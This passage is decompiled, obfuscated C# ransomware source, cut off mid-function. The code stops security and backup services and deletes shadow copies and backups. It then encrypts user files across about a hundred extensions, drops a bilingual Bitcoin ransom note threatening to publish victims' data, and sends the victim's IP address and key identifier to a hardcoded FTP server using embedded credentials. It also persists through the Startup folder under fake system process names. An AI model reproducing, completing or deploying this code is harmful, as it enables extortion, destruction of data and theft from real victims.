using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NebZuOsqGKsBdvX;

internal sealed class VTeoqoqDSFNL
{
	public sealed class ewRLNPjYMnUs
	{
		private static StringCollection pCldaRMcFJkMdY = new StringCollection();

		private static List<string> hdNykxucfvUlZ = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch (UnauthorizedAccessException ex)
			{
				pCldaRMcFJkMdY.Add(ex.Message);
			}
			catch (DirectoryNotFoundException)
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().EndsWith(".crypted"))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(nQvoVxtxpBwP) * 1024.0 * 1024.0 && YwZntAITANLKb == "YES")
							{
								hdNykxucfvUlZ.Add(text);
							}
							else if (File.Exists(text) && YwZntAITANLKb == "NO")
							{
								hdNykxucfvUlZ.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return hdNykxucfvUlZ;
		}
	}

	private sealed class FRhLfyczmDGYqvA
	{
		public string[] XyPhGJDWvGUPG;

		public string[] yLvXFOlVmAI;

		public string VtyStNcZltpAzV;

		public string rWueTXysUSrKh;
	}

	private sealed class kfyJctOBySfT
	{
		public FRhLfyczmDGYqvA AAzYqpNrrF;

		public string nFanOSGOzmEVsG;

		public void _003CCrypt_003Eb__6()
		{
			JyzZGfZYDvvOM(nFanOSGOzmEVsG, AAzYqpNrrF.XyPhGJDWvGUPG, AAzYqpNrrF.rWueTXysUSrKh, AAzYqpNrrF.yLvXFOlVmAI, AAzYqpNrrF.VtyStNcZltpAzV);
		}
	}

	public static string YqtIXhunqGmzfkO = "EVET";

	public static byte[] mCHGlwIXguOYBJo = null;

	public static string YwZntAITANLKb = "YES";

	public static string nQvoVxtxpBwP = "100";

	public static List<string> pdwfGfumrFQOLdtQ = new List<string>();

	public static List<string> FUJCzwEkmjMhFzDw = new List<string>();

	public static string leWFoTlYwGiwL = "NO";

	public static string QxgCPYStYumwo = "";

	public static string ekqsKmyuYU = "NO";

	public static int rcDWNndeaYje = 0;

	public static string qlvWIDLTnt = "NO";

	public static string ZtxqkkZGVxHX = "NO";

	public static string lwKNrcdbOiUEWjr = "NO";

	public static string OomFnaRXQvgZza = "0";

	public static string ewLnMWJwpbLFz = "NO";

	public static string CPGsysYYNsrl = "NO";

	public static string FvQpJAfcdffs = "NO";

	public static string GoLwXXaHLLsiZC = "YES";

	public static List<string> ExBUhQJSHkVrk = new List<string>
	{
		lwVwrthwLznWc("bHNhc3MuZXhl"),
		lwVwrthwLznWc("c3ZjaHN0LmV4ZQ=="),
		lwVwrthwLznWc("Y3Jjc3MuZXhl"),
		lwVwrthwLznWc("Y2hyb21lMzIuZXhl"),
		lwVwrthwLznWc("ZmlyZWZveC5leGU="),
		lwVwrthwLznWc("Y2FsYy5leGU="),
		lwVwrthwLznWc("bXlzcWxkLmV4ZQ=="),
		lwVwrthwLznWc("ZGxsaHN0LmV4ZQ=="),
		lwVwrthwLznWc("b3BlcmEzMi5leGU="),
		lwVwrthwLznWc("bWVtb3AuZXhl"),
		lwVwrthwLznWc("c3Bvb2xjdi5leGU="),
		lwVwrthwLznWc("Y3RmbW9tLmV4ZQ=="),
		lwVwrthwLznWc("U2t5cGVBcHAuZXhl")
	};

	public static List<string> TOiguUKqJdkh = new List<string>();

	public static string RgKKPPVFeqJhK = "NO";

	public static string tSefgpmjuCMX = "NO";

	public static string hBljMgZeGQhcl = "NO";

	public static List<string> CwSjPQISqaAa = new List<string>();

	public static string zEQSHaiWXlEMw = "YES";

	private static string oLpYqNLDmQmAQB = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string vDMfkoaGpneeQm = "YES";

	public static string ELKHrsCQkoCjIVsq = "NO";

	public static List<string> XIxVPIjloAh = new List<string>
	{
		lwVwrthwLznWc("c3RvcCBhdnBzdXMgL3k="),
		lwVwrthwLznWc("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		lwVwrthwLznWc("c3RvcCBtZmV3YyAveQ=="),
		lwVwrthwLznWc("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		lwVwrthwLznWc("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		lwVwrthwLznWc("c3RvcCBEZWZXYXRjaCAveQ=="),
		lwVwrthwLznWc("c3RvcCBjY0V2dE1nciAveQ=="),
		lwVwrthwLznWc("c3RvcCBjY1NldE1nciAveQ=="),
		lwVwrthwLznWc("c3RvcCBTYXZSb2FtIC95"),
		lwVwrthwLznWc("c3RvcCBSVFZzY2FuIC95"),
		lwVwrthwLznWc("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		lwVwrthwLznWc("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		lwVwrthwLznWc("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		lwVwrthwLznWc("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		lwVwrthwLznWc("c3RvcCBZb29CYWNrdXAgL3k="),
		lwVwrthwLznWc("c3RvcCBZb29JVCAveQ=="),
		lwVwrthwLznWc("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		lwVwrthwLznWc("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		lwVwrthwLznWc("c3RvcCBWU05BUFZTUyAveQ=="),
		lwVwrthwLznWc("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		lwVwrthwLznWc("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		lwVwrthwLznWc("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		lwVwrthwLznWc("c3RvcCB2ZWVhbSAveQ=="),
		lwVwrthwLznWc("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		lwVwrthwLznWc("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		lwVwrthwLznWc("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		lwVwrthwLznWc("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		lwVwrthwLznWc("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		lwVwrthwLznWc("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		lwVwrthwLznWc("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		lwVwrthwLznWc("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		lwVwrthwLznWc("c3RvcCBBY3JTY2gyU3ZjIC95"),
		lwVwrthwLznWc("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		lwVwrthwLznWc("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		lwVwrthwLznWc("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		lwVwrthwLznWc("c3RvcCBzb3Bob3MgL3k=")
	};

	public static List<string> wQIwLvleCVpsjx = new List<string>
	{
		lwVwrthwLznWc("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		lwVwrthwLznWc("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		lwVwrthwLznWc("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		lwVwrthwLznWc("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> jDECNuOtuPdyX = new List<string>
	{
		lwVwrthwLznWc("L0lNIG1zcHViLmV4ZSAvRg=="),
		lwVwrthwLznWc("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		lwVwrthwLznWc("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> ormexddeVTX = new List<string>
	{
		lwVwrthwLznWc("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		lwVwrthwLznWc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		lwVwrthwLznWc("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> pAoOZgAsOfpaM = new List<string>
	{
		lwVwrthwLznWc("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		lwVwrthwLznWc("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		lwVwrthwLznWc("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		lwVwrthwLznWc("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		lwVwrthwLznWc("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		lwVwrthwLznWc("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string phbDWrqkjzqoZv = "NO";

	public static string lCIHVSwLFNQmKn = "NO";

	internal static DateTime OYRQXfHuxqh = new DateTime(2000, 1, 1);

	internal static DateTime nHGuqpwnWnZjQ = new DateTime(2100, 1, 1);

	public static string bbtvtPLTiy = "NO";

	public static string CnKQtNjCjSMAUt = "10";

	public static string pxbzugzAjtPQQEU = "NO";

	public static string phNuoTLPzit = "NO";

	public static string GTGMkwPyuOi = "NO";

	public static string OKonuUETVMxlE = "YES";

	public static string wvnAtwSDBElLD = "NO";

	public static string fRlRBeLvclzVV = "YES";

	public static List<string> XdlKyyCvpCPeK = new List<string> { "docx", "pdf", "txt", "csv", "jpg", "jpeg", "doc" };

	public static string nXCoVqKcMsyKW = "YES";

	public static string ebLvKkjmyp = "1";

	public static string geYHGIwPXDOuuPbR = "NO";

	public static string PxPqJegYqeOPx = "NO";

	public static string ftTNztZGWBY = "NO";

	public static string vQftqEvwcBQM = string.Empty;

	public static string ZobyxmxOzEquUWK = "NO";

	public static string EsRRmEtzYBKKW = "YES";

	public static string DIluSjzWZj = "YES";

	public static string dCZPQZfUMCTL = "RG9uJ3QgZm9yZ2V0IHRvIFBheQ==";

	public static string TjBaAcuBKYE = "UGF5IGFuZCBjb250aW51ZSB5b3VyIG9sZCBsaWZlIGFzIHVzdWFsIQ0KQmV6YWhsZW4gU2llIHVuZCBmw7xocmVuIFNpZSBpaHIgQWx0ZXMgTGViZW4gd2llIGdld29obnQgd2VpdGVyIQ==";

	public static string CXxzIuKAkRjuSQb = "NO";

	public static string OkaBVVyotOGRA = "NO";

	public static string EEiGKNmZsb = "NO";

	public static string EvGrZAwzSlEU = "NO";

	private static void Main(string[] args)
	{
		try
		{
			PTJUVezpCs.YnjOjfNpifK(oLpYqNLDmQmAQB);
		}
		catch (Exception)
		{
		}
		if (lwKNrcdbOiUEWjr == "YES")
		{
			Thread.Sleep(int.Parse(OomFnaRXQvgZza));
		}
		if (OKonuUETVMxlE == "YES" && wvnAtwSDBElLD == "YES")
		{
			try
			{
				QAeIFgTAiVhuK(lwVwrthwLznWc("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (FvQpJAfcdffs == "YES" && !WDFUQIeGaMaV.Nyxahqcysep())
		{
			WDFUQIeGaMaV.bMAfJNpUBoSZD();
		}
		if (tSefgpmjuCMX == "YES" && WDFUQIeGaMaV.Nyxahqcysep())
		{
			new RpHGXTOgyyTS().KVPdCGEEcQpD(bool_0: false);
			new RpHGXTOgyyTS().esAPrygzUSC();
		}
		if (ZtxqkkZGVxHX == "YES")
		{
			PmWUVQfpwqLnPA.BVpuqPfatAJ();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (ekqsKmyuYU == "YES" && fileName != text2)
		{
			Thread thread = new Thread(qlQVFxpOXZNepv);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Highest;
			thread.Start();
		}
		if (leWFoTlYwGiwL == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				rcDWNndeaYje = NpjeJDFeQopYOj(0, ExBUhQJSHkVrk.Count);
				File.Copy(fileName, text + ExBUhQJSHkVrk[rcDWNndeaYje], overwrite: true);
				Process.Start(text + ExBUhQJSHkVrk[rcDWNndeaYje]);
				BfiKtGNnkbe();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (phbDWrqkjzqoZv == "YES" && DateTime.Now < OYRQXfHuxqh)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (lCIHVSwLFNQmKn == "YES" && DateTime.Now > nHGuqpwnWnZjQ)
			{
				BfiKtGNnkbe();
			}
		}
		catch
		{
		}
		foreach (string item in XIxVPIjloAh)
		{
			shLyHcuGUtora("net.exe", item);
		}
		foreach (string item2 in wQIwLvleCVpsjx)
		{
			shLyHcuGUtora("sc.exe", item2);
		}
		foreach (string item3 in jDECNuOtuPdyX)
		{
			shLyHcuGUtora("taskkill.exe", item3);
		}
		foreach (string item4 in ormexddeVTX)
		{
			shLyHcuGUtora("vssadmin.exe", item4);
		}
		foreach (string item5 in pAoOZgAsOfpaM)
		{
			shLyHcuGUtora("del.exe", item5);
		}
		gWolHdNORgEIek.EHEMQwfkwF();
		if (pxbzugzAjtPQQEU == "NO")
		{
			QxgCPYStYumwo = tZfcZtALIpe.CCbMaPUDPGrcZD(32);
		}
		else
		{
			QxgCPYStYumwo = "MZ1HFLDRZ3KFJGHECEKCNA3FZ23IVXTW";
		}
		string text3 = SBbFxsMjcALMbFpB.FFibVRaXAx(QxgCPYStYumwo);
		try
		{
			hsYEsHasdeRCN(new string[1] { "[auto]" }, new string[101]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
				"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
				"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
				"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
				"7z"
			}, new string[0], QxgCPYStYumwo, ".crypted");
		}
		catch
		{
			BfiKtGNnkbe();
		}
		QxgCPYStYumwo = tZfcZtALIpe.CCbMaPUDPGrcZD(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_MY_FILES_NOT_MAKE_PUBLIC.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_MY_FILES_NOT_MAKE_PUBLIC.txt");
			streamWriter.WriteLine(lwVwrthwLznWc("QXRlbnRpb24hIGFsbCB5b3VyIGltcG9ydGFudCBmaWxlcyB3ZXJlIGVuY3J5cHRlZCENCnRvIGdldCB5b3VyIGZpbGVzIGJhY2sgc2VuZCAyNTAgRXVybyBpbiBCaXRjb2lucyBhbmQgY29udGFjdCB1cyBvbiBFLU1haWwgd2l0aCBwcm9vZiBvZiBwYXltZW50IA0KYW5kIHlvdXIgS2V5IElkZW50aWZpZXIsIHlvdSBjYW4gZmluZCB0aGlzIGhlcmUuDQpXZSB3aWxsIHNlbmQgeW91IGEgZGVjcnlwdGlvbiB0b29sIHdpdGggeW91ciBwZXJzb25hbCBkZWNyeXB0aW9uIHBhc3N3b3JkLg0KV2hlbiB5b3Ugbm90IENvbnRhY3QgdXMgYW5kIFBheSwgd2UgZG8gbWFrZSB5b3VyIERhdGEgUHVibGljIG9uIGEgV2Vic2l0ZXMsIHdoZXJlIGV2ZXJ5b25lIHNlZXMgdGhlaXIgZW50aXJlIGNvbXB1dGVyIGNvbnRlbnQgZnJvbSB5b3UuDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KV2hlcmUgY2FuIHlvdSBidXkgQml0Y29pbnM6DQoNCmh0dHBzOi8vd3d3LmNvaW5iYXNlLmNvbQ0KaHR0cHM6Ly9sb2NhbGJpdGNvaW5zLmNvbQ0KaHR0cHM6Ly9hbnljb2luLmV1DQpodHRwczovL2JpdHBhbmRhLmNvbQ0KaHR0cHM6Ly9iaW5hbmNlLmNvbQ0KaHR0cHM6Ly9iaXRjb2luYm9uLmF0DQoNCkZvciBTd2l0emVybGFuZCBhbmQgQXVzdHJpYQ0KQml0Y29pbiBBdXRvbWF0IFbDpHJkZXggLSBTd2lzcyBDbGllbnRzDQpBbGwgU0JCIEF1dG9tYXQgIC0gU3dpc3MgQ2xpZW50cw0KQml0Y29pbiBCb24gLSBBdXN0cmlhIENsaWVudHMNCg0KWW91IGNhbiBjYWxjdWxhdGUgdGhlIEJpdGNvaW4gcmF0ZSBoZXJlOg0KaHR0cHM6Ly9wcmVldi5jb20NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpDb250YWN0OiB0aW1lcGF5QHByb3Rvbm1haWwuY29tDQoNClBsZWFzZSBzZW5kIHVzIHRoZSBrZXkgaWRlbnRpZmljYXRpb24gY29kZSB2aWEgZW1haWwsIHdoaWNoIHlvdSBjYW4gc2VlIGF0IHRoZSBib3R0b20gb2YgdGhpcyB0ZXh0IGFzIHNvb24gYXMgdGhlIHBheW1lbnQgaGFzIGJlZW4gbWFkZSBieSB5b3UuDQoNClBsZWFzZSBzZW5kIHRoZSBCaXRjb2luIG9uIHRoaXMgQWRyZXNzIGZvciB0aGUgUGF5bWVudDoNCg0KYmMxcTVkbjN0YzY3d2g5MG1ycTY1eG04YTJ6OWxyOXQwdGMybGN0d3YzDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkdFUk1BTiBTUEVBSyBDTElFTlRTDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkFjaHR1bmchIEFsbGUgSWhyZSBEYXRlbiB3dXJkZW4gdmVyc2NobMO8c3NlbHQsIHdlbm4gU2llIGFsbGUgaWhyZSBEYXRlbiBhdWYgSWhyZW0gUmVjaG5lciB3aWVkZXIgd29sbGVuLCBkYW5uIEJlemFobGVuIFNpZSAyNTAgRXVybyBpbiBCaXRjb2lucw0KdW5kIEtvbnRha3RpZXJlbiBTaWUgdW5zIHZpYSBFLU1haWwgbWl0IGVpbmVyIEJlc3TDpHRpZ3VuZyBkZXIgWmFobHVuZyBhbiB1bnNlcmUgQml0Y29pbiBBZHJlc3NlLg0KV2lyIHNlbmRlbiBJaG5lbiBkYW5uIGVpbiBFbnRzY2hsw7xzc2VsdW5ncyBQcm9ncmFtbSBkYW1pdCBTaWUgYWxsZXMgd2llZGVyIEVudHNjaGzDvHNzZWxuIGvDtm5uZW4uDQpGYWxscyBTaWUgbmljaHQgaW5uZXJoYWxiIGVpbiBwYWFyIFRhZ2VuIEJlemFobGVuLHdlcmRlbiB3aXIgSWhyZSBEYXRlIGF1ZiBlaW5lciBXZWJzZWl0ZSB2ZXLDtmZmZW50bGljaGVuIGRpZSBmw7xyIGplZGVuIFp1Z8OkbmdsaWNoIGlzdC4NCk9iZXJoYWxiIGRlcyBUZXh0ZXMgc2VoZW4gU2llIHdvIFNpZSBkaWUgQml0Y29pbnMgZXJ3ZXJiZW4ga8O2bm5lbiB1bSBkaWVzZSBhbiB1bnMgenUgc2VuZGVuLg0KDQpCaXR0ZSBzZW5kZW4gU2llIHVucyB2aWEgRS1NYWlsIGRlbiBLZXkgSWRlbnRpZmlrYXRpb25zY29kZSwgZGllc2VuIHNlaGVuIFNpZSBnYW56IHVudGVuIGluIGRpZXNlbSBUZXh0IGF1ZmdlZsO8aHJ0LCBzb2JhbGQgZGllIFphaGx1bmcgZ2V0w6R0aWd0IHd1cmRlIHZvbiBJaG5lbi4NCg0KVW5zZXJlIEtvbnRha3QgRS1NYWlsIDogdGltZXBheUBwcm90b25tYWlsLmNvbQ0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQml0dGUgc2VuZGVuIHNpZSBoaWVyaGluIGRpZSBCaXRjb2lucyBmw7xyIGRpZSBaYWhsdW5nDQoNCmJjMXE1ZG4zdGM2N3doOTBtcnE2NXhtOGEyejlscjl0MHRjMmxjdHd2Mw0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpJREVOVElGSUNBVElPTlNLRVkgIC0gSURFTlRJRktBVElPTlNDT0RFICAgLyAgU0VORCBUSElTIENPREUgVklBIEUtTUFJTA=="));
			streamWriter.WriteLine(text3);
			if (vDMfkoaGpneeQm == "NO")
			{
				streamWriter.WriteLine(lwVwrthwLznWc("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(CwSjPQISqaAa.Count));
			}
		}
		foreach (string item6 in TOiguUKqJdkh)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_MY_FILES_NOT_MAKE_PUBLIC.txt", item6 + "\\HELP_ME_MY_FILES_NOT_MAKE_PUBLIC.txt", overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (zEQSHaiWXlEMw == "YES")
		{
			try
			{
				if (vDMfkoaGpneeQm == "NO")
				{
					QRoenrHGXDNnO.QrZeevPGqnoYtm("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", lwVwrthwLznWc("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(lwVwrthwLznWc("aHR0cDovL2ljYW5oYXppcC5jb20=")) + lwVwrthwLznWc("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + lwVwrthwLznWc("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(CwSjPQISqaAa.Count) + "\r\n" + lwVwrthwLznWc("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(CwSjPQISqaAa) + "\r\n" + lwVwrthwLznWc("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					QRoenrHGXDNnO.QrZeevPGqnoYtm("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", lwVwrthwLznWc("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + lwVwrthwLznWc("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + lwVwrthwLznWc("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(CwSjPQISqaAa) + "\r\n" + lwVwrthwLznWc("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (GoLwXXaHLLsiZC == "YES")
		{
			try
			{
				MVUqwuDTfez.IhlOfPhHxBtOs(new Uri("http://noether-stiftung.de/screen/screen.bmp"));
			}
			catch
			{
			}
		}
		Process.Start(lwVwrthwLznWc("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_MY_FILES_NOT_MAKE_PUBLIC.txt");
		if (EsRRmEtzYBKKW == "YES")
		{
			vfIEPPzqRdR();
